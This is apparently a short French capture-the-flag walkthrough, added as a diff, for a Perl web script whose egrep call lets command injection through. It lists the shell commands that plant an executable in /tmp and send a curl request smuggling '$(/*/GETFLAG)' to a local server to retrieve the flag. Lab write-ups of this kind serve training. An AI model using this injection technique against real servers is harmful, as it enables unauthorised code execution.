@@ -1,0 +1,9 @@
+On voit un fichier perl, qui tourne dans un serveur perl
+Il est possible d'injecter du codee dans le fichier perl a cause de egrep, 
+qui est lance par le terminal. 
+    echo "getflag>/tmp/flag" > /tmp/GETFLAG
+        create executable with uppercase
+    chmod 777 /tmp/GETFLAG
+        give permission
+    curl 'localhost:4646?x=$(/*/GETFLAG)'
+    cat /tmp/flag
